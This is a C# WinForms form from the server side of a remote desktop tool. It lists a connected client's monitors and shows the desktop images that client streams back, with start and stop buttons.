using Serveur.Controllers;
using Serveur.Controllers.Server;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmRemoteDesktop : Form
    {
        private ClientMosaic _client;
        private int _screens;
        public bool stopRdp = false;

        public FrmRemoteDesktop(ClientMosaic client)
        {
            InitializeComponent();
            client.value.frmRdp = this;
            _client = client;
        }

        private void FrmRemoteDesktop_Load(object sender, System.EventArgs e)
        {
            if (_client.value != null)
                new Packets.ServerPackets.GetMonitors().Execute(_client);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            stopRdp = false;
            FrmRemoteDesktopController.getDesktop(_client, cbMonitors.SelectedIndex);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            stopRdp = true;
        }

        public void cleanComboBox()
        {
            try
            {
                tsRdp.Invoke((MethodInvoker)delegate
                {
                    cbMonitors.Items.Clear();
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public void addScreens(int screens)
        {
            this._screens = screens;
            try
            {
                tsRdp.Invoke((MethodInvoker)delegate
                {
                    for (int i = 0; i < _screens; i++)
                    {
                        cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
                    }
                    cbMonitors.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void updateRdp(Image desktop)
        {
            try
            {
                pbRdp.Invoke((MethodInvoker)delegate
                {
                    pbRdp.Image = desktop;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            stopRdp = true;
        }
    }
}
